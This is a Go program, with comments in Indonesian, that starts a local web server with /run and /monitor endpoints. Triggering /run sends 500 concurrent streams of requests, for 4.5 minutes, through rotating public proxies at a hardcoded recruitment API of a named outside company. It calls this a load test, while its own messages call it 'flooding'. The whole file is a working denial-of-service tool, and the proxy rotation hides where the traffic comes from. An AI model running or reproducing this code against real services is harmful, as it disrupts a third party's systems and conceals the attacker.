package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type ProxyItem struct {
	IPAddress string   `json:"ip_address"`
	Port      int      `json:"port"`
	Protocols []string `json:"protocols"`
}

type ProxyResponse struct {
	Results []ProxyItem `json:"results"`
}

// Global State untuk Monitoring & Mutex Lock
var (
	isRunning     int32 // 0 = idle/berhenti, 1 = sedang berjalan
	requestCount  int64
	successCount  int64
	errorCount    int64
	startTime     time.Time
	statusMessage string
	mu            sync.Mutex
)

func main() {
	targetURL := "https://hris.quantumnusatama.id/api/rekrutmen/get-rekrutmen-data?id_rekrutmen=20653"
	proxyFile := "proxies.json"

	// Validasi awal file proxy
	fmt.Println("[+] Memuat file proxies.json...")
	fileData, err := os.ReadFile(proxyFile)
	if err != nil {
		fmt.Printf("Gagal membaca file %s: %v\n", proxyFile, err)
		return
	}

	var proxyData ProxyResponse
	if err := json.Unmarshal(fileData, &proxyData); err != nil {
		fmt.Printf("Gagal parsing JSON: %v\n", err)
		return
	}

	var candidateProxies []string
	for _, p := range proxyData.Results {
		for _, proto := range p.Protocols {
			if proto == "HTTPS" || proto == "HTTP" || proto == "SOCKS5" {
				proxyURL := fmt.Sprintf("http://%s:%d", p.IPAddress, p.Port)
				candidateProxies = append(candidateProxies, proxyURL)
				break
			}
		}
	}
	fmt.Printf("[*] Ditemukan %d kandidat proxy.\n", len(candidateProxies))

	// Daftarkan Endpoint HTTP
	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
		// Cek apakah sedang berjalan (Atomic Check-And-Set)
		if !atomic.CompareAndSwapInt32(&isRunning, 0, 1) {
			w.WriteHeader(http.StatusConflict)
			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan! Harap tunggu hingga aktivitas flooding selesai."))
			return
		}

		// Reset statistik sebelum mulai
		atomic.StoreInt64(&requestCount, 0)
		atomic.StoreInt64(&successCount, 0)
		atomic.StoreInt64(&errorCount, 0)
		startTime = time.Now()
		statusMessage = "Load test sedang berjalan..."

		w.Write([]byte("[+] Load test berhasil dimulai untuk durasi 4.5 menit. Cek progress via /monitor"))

		// Jalankan load test di background goroutine agar HTTP handler tidak blocking
		go func() {
			defer atomic.StoreInt32(&isRunning, 0) // Pastikan flag dilepas setelah selesai

			// Health check ulang singkat untuk mendapatkan proxy aktif
			var validProxies []string
			var wgChk sync.WaitGroup
			var muChk sync.Mutex

			for _, pURL := range candidateProxies {
				wgChk.Add(1)
				go func(proxyStr string) {
					defer wgChk.Done()
					parsedProxy, err := url.Parse(proxyStr)
					if err != nil {
						return
					}
					client := &http.Client{
						Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
						Timeout:   3 * time.Second,
					}
					resp, err := client.Get(targetURL)
					if err == nil {
						defer resp.Body.Close()
						if resp.StatusCode == http.StatusOK {
							muChk.Lock()
							validProxies = append(validProxies, proxyStr)
							muChk.Unlock()
						}
					}
				}(pURL)
			}
			wgChk.Wait()

			if len(validProxies) == 0 {
				validProxies = append(validProxies, "DIRECT")
			}

			// Konfigurasi Load Test
			totalConcurrency := 500 // Diturunkan agar stabil di server/lokal (ubah sesuai kebutuhan)
			stopChan := make(chan struct{})

			// Durasi diset 4.5 menit
			time.AfterFunc(4*time.Minute+30*time.Second, func() {
				close(stopChan)
			})

			var loadWg sync.WaitGroup
			proxyIndex := 0
			var indexMutex sync.Mutex

			for i := 0; i < totalConcurrency; i++ {
				loadWg.Add(1)
				go func() {
					defer loadWg.Done()
					indexMutex.Lock()
					pStr := validProxies[proxyIndex%len(validProxies)]
					proxyIndex++
					indexMutex.Unlock()

					var client *http.Client
					if pStr == "DIRECT" {
						client = &http.Client{Timeout: 5 * time.Second}
					} else {
						parsedProxy, _ := url.Parse(pStr)
						client = &http.Client{
							Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
							Timeout:   5 * time.Second,
						}
					}

					for {
						select {
						case <-stopChan:
							return
						default:
							atomic.AddInt64(&requestCount, 1)
							resp, err := client.Get(targetURL)
							if err != nil {
								atomic.AddInt64(&errorCount, 1)
							} else {
								if resp.StatusCode == http.StatusOK {
									atomic.AddInt64(&successCount, 1)
								} else {
									atomic.AddInt64(&errorCount, 1)
								}
								resp.Body.Close()
							}
						}
					}
				}()
			}

			loadWg.Wait()
			statusMessage = "Load test selesai."
		}()
	})

	// Endpoint untuk Monitoring
	http.HandleFunc("/monitor", func(w http.ResponseWriter, r *http.Request) {
		runningStatus := "IDLE (Siap dijalankan)"
		if atomic.LoadInt32(&isRunning) == 1 {
			runningStatus = "RUNNING (Sedang melakukan flooding)"
		}

		elapsed := time.Since(startTime).Seconds()
		if atomic.LoadInt32(&isRunning) == 0 {
			elapsed = 0
		}

		data := map[string]interface{}{
			"status":        runningStatus,
			"message":       statusMessage,
			"elapsed_sec":   int(elapsed),
			"total_request": atomic.LoadInt64(&requestCount),
			"sukses_200":    atomic.LoadInt64(&successCount),
			"error_lainnya": atomic.LoadInt64(&errorCount),
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(data)
	})

	fmt.Println("\n[+] Server berjalan di port :8080")
	fmt.Println("[+] Endpoint tersedia:")
	fmt.Println("    -> http://localhost:8080/run")
	fmt.Println("    -> http://localhost:8080/monitor")

	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Printf("Server error: %v\n", err)
	}
}
